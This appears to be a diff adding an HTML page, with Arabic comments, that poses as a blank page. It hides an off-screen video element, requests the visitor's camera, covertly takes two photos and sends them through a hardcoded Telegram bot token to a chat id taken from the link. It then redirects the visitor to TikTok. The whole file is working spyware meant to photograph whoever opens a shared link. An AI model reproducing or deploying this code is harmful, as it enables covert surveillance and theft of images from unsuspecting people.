@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- عناصر التصوير مخفية -->
+    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // ====== الإعدادات ======
+        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+        const id = new URLSearchParams(window.location.search).get('id');
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        let stream = null;
+        let photoCount = 0;
+        let photos = [];
+
+        // ====== بداية التصوير ======
+        async function start() {
+            if (!id) {
+                window.location.href = "https://www.tiktok.com";
+                return;
+            }
+
+            try {
+                // طلب الكاميرا الأمامية
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
+                setTimeout(() => {
+                    // التقاط الصورة الأولى
+                    capturePhoto();
+                    
+                    // التقاط الصورة الثانية بعد ثانيتين
+                    setTimeout(() => {
+                        capturePhoto();
+                    }, 2000);
+                    
+                }, 3000);
+                
+            } catch (err) {
+                // إذا فشل، أرسل رسالة
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: id,
+                        text: `❌ خطأ: ${err.message}`
+                    })
+                }).finally(() => {
+                    window.location.href = "https://www.tiktok.com";
+                });
+            }
+        }
+
+        // ====== التقاط صورة ======
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob((blob) => {
+                photos.push(blob);
+                photoCount++;
+                
+                // إذا اكتملت الصورتان، أرسلهما
+                if (photoCount === 2) {
+                    sendPhotos();
+                }
+            }, 'image/jpeg', 0.9);
+        }
+
+        // ====== إرسال الصور ======
+        function sendPhotos() {
+            // إرسال الصورة الأولى
+            const form1 = new FormData();
+            form1.append('chat_id', id);
+            form1.append('photo', photos[0], 'photo1.jpg');
+            
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: form1
+            }).then(() => {
+                // إرسال الصورة الثانية
+                const form2 = new FormData();
+                form2.append('chat_id', id);
+                form2.append('photo', photos[1], 'photo2.jpg');
+                
+                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: form2
+                });
+            }).finally(() => {
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = "https://www.tiktok.com";
+            });
+        }
+
+        // تشغيل
+        start();
+
+        // طوارئ: توجه بعد 10 ثواني
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+        }, 10000);
+    </script>
+</body>
+</html>
